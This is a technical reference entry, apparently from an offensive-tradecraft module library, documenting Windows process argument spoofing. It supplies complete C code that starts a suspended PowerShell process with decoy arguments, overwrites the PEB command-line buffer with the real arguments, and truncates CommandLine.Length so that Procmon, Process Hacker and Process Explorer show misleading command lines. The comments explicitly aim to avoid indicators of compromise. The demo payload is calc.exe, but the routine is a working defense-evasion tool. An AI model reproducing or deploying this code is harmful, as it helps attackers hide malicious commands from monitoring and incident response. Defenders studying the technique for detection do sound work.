## Process Argument Spoofing (2)

Extends the basic argument spoofing technique by additionally patching `PEB->ProcessParameters->CommandLine.Length` in the suspended remote process. The first patch overwrites `CommandLine.Buffer` with the real arguments (identical to Module 48). The second patch shrinks `CommandLine.Length` to `sizeof(L"powershell.exe")`, which limits what runtime inspection tools such as Process Hacker and Process Explorer read from the buffer — since these tools use `NtQueryInformationProcess` at runtime and honour `CommandLine.Length` rather than relying on a null terminator. The result is that the process executes the real arguments while inspection tools show only the truncated stub (e.g. `powershell.exe`).

> `szStartupArgs` must always be longer than `szRealArgs`. The `SIZE_EXPOSED_FROMPAYLOAD` macro controls how much of `CommandLine.Buffer` is visible to external tools after the length patch.

**Usage**

Call `CreateArgSpoofedProcess2` with the dummy wide-character argument string, the real wide-character argument string to execute, and three `OUT` pointers that receive the new process's PID, process handle, and thread handle.

- `IN LPWSTR szStartupArgs`  Dummy wide-character command line shown at process creation (e.g. `L"powershell.exe Totally Legit Argument"`); must be longer than `szRealArgs`.
- `IN LPWSTR szRealArgs`  Real wide-character arguments to execute after the PEB patch (e.g. `L"powershell.exe -NoExit calc.exe"`).
- `OUT DWORD* dwProcessId`  Receives the PID of the newly created process.
- `OUT HANDLE* hProcess`  Receives a handle to the newly created process.
- `OUT HANDLE* hThread`  Receives a handle to the primary thread of the newly created process.

**Return Value**

`BOOL`  Returns `TRUE` if the process was created, both PEB fields patched, and the process resumed successfully, otherwise `FALSE`.

**External Files**

- `windows.h`  `LPWSTR`, `HANDLE`, `DWORD`, `BOOL`, `NTSTATUS`, `ULONG`, `PPEB`, `PBYTE`, `PRTL_USER_PROCESS_PARAMETERS`, `STARTUPINFOW`, `PROCESS_INFORMATION`, `PROCESS_BASIC_INFORMATION`, `IN`, `OUT`, `CreateProcessW()`, `ResumeThread()`, `GetProcAddress()`, `GetModuleHandleW()`, `HeapFree()`, `GetProcessHeap()`, `RtlSecureZeroMemory()`, `lstrlenW()`, `lstrcpyW()`, `GetLastError()`
- `winternl.h`  `PEB`, `RTL_USER_PROCESS_PARAMETERS`, `PROCESSINFOCLASS`, `ProcessBasicInformation`
- `stdio.h`  `printf()`, `wprintf()`

### Code

```c
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma warning(disable:4996)

// What external tools (Process Hacker, Process Explorer) will see in the command line.
// Set to the size of the stub you want exposed, e.g. just the process name.
#define SIZE_EXPOSED_FROMPAYLOAD    sizeof(L"powershell.exe")

typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
    HANDLE           ProcessHandle,             // Handle to the process to query.
    PROCESSINFOCLASS ProcessInformationClass,   // Class of information to retrieve.
    PVOID            ProcessInformation,        // Output buffer.
    ULONG            ProcessInformationLength,  // Size of the output buffer.
    PULONG           ReturnLength               // Receives the number of bytes written.
);


// Helper: allocates a heap buffer and reads dwBufferSize bytes from pAddress in hProcess.
BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN DWORD dwBufferSize)
{
    SIZE_T sNmbrOfBytesRead = NULL;

    *ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);

    if (!ReadProcessMemory(
        hProcess,           // Handle to the remote process.
        pAddress,           // Remote address to read from.
        *ppReadBuffer,      // Local destination buffer.
        dwBufferSize,       // Number of bytes to read.
        &sNmbrOfBytesRead   // Receives the number of bytes actually read.
    ) || sNmbrOfBytesRead != dwBufferSize) {
        printf("[!] ReadProcessMemory Failed With Error : %d \n", GetLastError());
        printf("[i] Bytes Read : %d Of %d \n", sNmbrOfBytesRead, dwBufferSize);
        return FALSE;
    }

    return TRUE;
}


// Helper: writes pBuffer of dwBufferSize bytes to pAddressToWriteTo in hProcess.
BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVOID pBuffer, IN DWORD dwBufferSize)
{
    SIZE_T sNmbrOfBytesWritten = NULL;

    if (!WriteProcessMemory(
        hProcess,               // Handle to the remote process.
        pAddressToWriteTo,      // Remote address to overwrite.
        pBuffer,                // Source buffer to write.
        dwBufferSize,           // Number of bytes to write.
        &sNmbrOfBytesWritten    // Receives the number of bytes actually written.
    ) || sNmbrOfBytesWritten != dwBufferSize) {
        printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        printf("[i] Bytes Written : %d Of %d \n", sNmbrOfBytesWritten, dwBufferSize);
        return FALSE;
    }

    return TRUE;
}


BOOL CreateArgSpoofedProcess2(IN LPWSTR szStartupArgs, IN LPWSTR szRealArgs, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread)
{
    NTSTATUS                    STATUS  = NULL;
    WCHAR                       szProcess[MAX_PATH];
    STARTUPINFOW                Si      = { 0 };
    PROCESS_INFORMATION         Pi      = { 0 };
    PROCESS_BASIC_INFORMATION   PBI     = { 0 };
    ULONG                       uRetern = NULL;
    PPEB                        pPeb    = NULL;
    PRTL_USER_PROCESS_PARAMETERS pParms = NULL;

    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    Si.cb = sizeof(STARTUPINFOW);

    // Resolve NtQueryInformationProcess from ntdll.dll at runtime.
    fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(
        GetModuleHandleW(L"NTDLL"),         // ntdll.dll is always loaded in every process.
        "NtQueryInformationProcess"         // Returns process information including PEB address.
    );
    if (pNtQueryInformationProcess == NULL)
        return FALSE;

    // Copy the dummy argument into a local writable buffer as required by CreateProcessW.
    lstrcpyW(szProcess, szStartupArgs);

    // Step 1 — Create the target process suspended with the dummy arguments.
    // Procmon captures szStartupArgs at creation time.
    if (!CreateProcessW(
        NULL,                           // No explicit application name — use szProcess.
        szProcess,                      // Dummy command line visible to Procmon at creation.
        NULL,                           // Default process security attributes.
        NULL,                           // Default thread security attributes.
        FALSE,                          // Do not inherit handles.
        CREATE_SUSPENDED |              // Suspend so the PEB can be patched before execution.
        CREATE_NO_WINDOW,               // No console window.
        NULL,                           // Inherit the parent's environment block.
        L"C:\\Windows\\System32\\",     // Set current directory to avoid a path-based IoC.
        &Si,                            // Standard startup info.
        &Pi                             // Receives the new process and thread handles.
    )) {
        printf("\t[!] CreateProcessW Failed with Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("\t[i] Target Process Created With Pid : %d \n", Pi.dwProcessId);

    // Step 2 — Retrieve the remote PEB base address via NtQueryInformationProcess.
    if ((STATUS = pNtQueryInformationProcess(
        Pi.hProcess,                        // Handle to the suspended remote process.
        ProcessBasicInformation,            // Returns PROCESS_BASIC_INFORMATION.
        &PBI,                               // Output: includes PebBaseAddress.
        sizeof(PROCESS_BASIC_INFORMATION),
        &uRetern
    )) != 0) {
        printf("\t[!] NtQueryInformationProcess Failed With Error : 0x%0.8X \n", STATUS);
        return FALSE;
    }

    // Step 3 — Read the remote PEB structure.
    if (!ReadFromTargetProcess(Pi.hProcess, PBI.PebBaseAddress, &pPeb, sizeof(PEB))) {
        printf("\t[!] Failed To Read Target's Process Peb \n");
        return FALSE;
    }

    // Step 4 — Read RTL_USER_PROCESS_PARAMETERS from the remote PEB.
    // Extra 0xFF bytes ensure CommandLine.Buffer falls within the read range.
    if (!ReadFromTargetProcess(
        Pi.hProcess,
        pPeb->ProcessParameters,
        &pParms,
        sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF
    )) {
        printf("\t[!] Failed To Read Target's Process ProcessParameters \n");
        return FALSE;
    }

    // Step 5 — Patch 1: overwrite CommandLine.Buffer with the real arguments.
    // After this write, the process will execute szRealArgs when resumed.
    // Result in buffer: "powershell.exe -NoExit calc.exe ument" (tail of dummy remains).
    if (!WriteToTargetProcess(
        Pi.hProcess,
        (PVOID)pParms->CommandLine.Buffer,                              // Remote: CommandLine.Buffer.
        (PVOID)szRealArgs,                                              // Real args to execute.
        (DWORD)(lstrlenW(szRealArgs) * sizeof(WCHAR) + sizeof(WCHAR))  // Bytes to write incl. null terminator.
    )) {
        printf("\t[!] Failed To Write The Real Parameters \n");
        return FALSE;
    }

    // Step 6 — Patch 2: shrink CommandLine.Length to SIZE_EXPOSED_FROMPAYLOAD.
    // Tools like Process Hacker use NtQueryInformationProcess at runtime and read
    // CommandLine.Buffer only up to CommandLine.Length bytes. By shrinking the length,
    // only the stub (e.g. "powershell.exe") is visible to those tools.
    DWORD dwNewLen = SIZE_EXPOSED_FROMPAYLOAD;

    if (!WriteToTargetProcess(
        Pi.hProcess,
        // Calculate the remote address of the CommandLine.Length field inside ProcessParameters.
        (PBYTE)pPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length),
        (PVOID)&dwNewLen,   // New length value — limits how much tools read from CommandLine.Buffer.
        sizeof(DWORD)       // USHORT field stored as DWORD here; write 4 bytes.
    )) {
        printf("\t[!] Failed To Write The New CommandLine.Length \n");
        return FALSE;
    }

    // Clean up local heap copies — no longer needed.
    HeapFree(GetProcessHeap(), NULL, pPeb);
    HeapFree(GetProcessHeap(), NULL, pParms);

    // Step 7 — Resume the process; it executes szRealArgs while tools see only the stub.
    ResumeThread(Pi.hThread);

    *dwProcessId    = Pi.dwProcessId;
    *hProcess       = Pi.hProcess;
    *hThread        = Pi.hThread;

    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
        return TRUE;

    return FALSE;
}
```

**Example**

```c
HANDLE  hProcess    = NULL;
HANDLE  hThread     = NULL;
DWORD   dwProcessId = NULL;

// szStartupArgs must be LONGER than szRealArgs.
// SIZE_EXPOSED_FROMPAYLOAD controls what Process Hacker sees (sizeof(L"powershell.exe")).
LPWSTR szStartupArgs = L"powershell.exe Totally Legit Argument";
LPWSTR szRealArgs    = L"powershell.exe -NoExit calc.exe";

// Procmon logs:        "powershell.exe Totally Legit Argument"  (dummy — at creation)
// Process Hacker sees: "powershell.exe"                         (truncated by length patch)
// Process executes:    "powershell.exe -NoExit calc.exe"        (real args in buffer)
CreateArgSpoofedProcess2(szStartupArgs, szRealArgs, &dwProcessId, &hProcess, &hThread);
```

**Parameter Sources**

No external handle inputs — `hProcess` and `hThread` are produced internally by `CreateProcessW` and returned as outputs.
